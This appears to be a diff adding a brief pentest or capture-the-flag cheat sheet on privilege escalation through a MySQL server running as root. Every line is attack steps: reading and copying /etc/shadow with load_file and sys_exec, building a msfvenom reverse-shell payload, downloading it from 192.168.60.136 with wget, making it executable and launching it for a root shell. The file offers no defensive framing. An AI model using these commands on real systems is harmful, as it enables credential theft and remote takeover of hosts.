@@ -1,0 +1,22 @@
+### If mysql is running as root, then the below commands work well
+
+mysql> select load_file('/etc/shadow');
+
+mysql> select sys_exec("cat /etc/shadow > /tmp/shadow");
+
+mysql> select sys_exec("chown john /tmp/shadow");
+
+### Prepare a reverse shell, transfer to target, set proper owner/perms, execute reverse shell for root
+msfvenom --payload=linux/x86/shell_reverse_tcp --format=elf lhost=192.168.60.136 lport=1234 > /var/www/shell
+
+select sys_exec('wget http://192.168.60.136/shell -O /tmp/shell');
+
+mysql> select sys_exec('chown john /tmp/shell');
+mysql> select sys_exec('chmod +x /tmp/shell');
+
+mysql> select sys_exec("cd /tmp && ./shell");
+
+
+
+
+
